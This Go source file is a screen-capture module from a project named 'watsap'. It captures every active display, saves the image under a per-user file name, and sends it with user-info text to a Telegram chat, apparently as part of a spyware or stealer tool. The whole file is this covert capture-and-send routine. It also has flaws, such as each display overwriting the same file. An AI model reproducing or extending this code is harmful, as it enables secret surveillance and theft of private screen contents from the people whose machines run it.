package screen

import (
	"fmt"
	"image/png"
	"log"
	"os"
	"watsap/utils/config"
	"watsap/utils/messages"
	"watsap/utils/telegram"

	"github.com/kbinani/screenshot"
)

var FileName = ""

// take fullscreen screenshot
func TakeScreenshot() {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		log.Println("Headless system")
		os.Exit(1)
		return
	}

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Printf("[Screen][ERROR] Failed to capture screen: %v", err)
			return
		}
		FileName := getScreenshotFile()
		file, err := os.Create(FileName)
		if err != nil {
			log.Printf("[Screen][ERROR] Failed to create file: %v", err)
			return
		}
		defer file.Close()

		png.Encode(file, img)
		log.Printf("[Screen][INFO] Screenshot saved to: %v", FileName)

	}
}

func SendScreenshot() {
	telegram.TgSendFile(getScreenshotFile(), messages.GetUserInfoMsg())
	if config.DebugMode {
		os.Remove(getScreenshotFile())
	}
}

func getScreenshotFile() string {
	return fmt.Sprintf("%s/%s-screenshot.png", config.WaDir, *config.UserID)
}

func InitScreen() {
	TakeScreenshot()
	SendScreenshot()
}
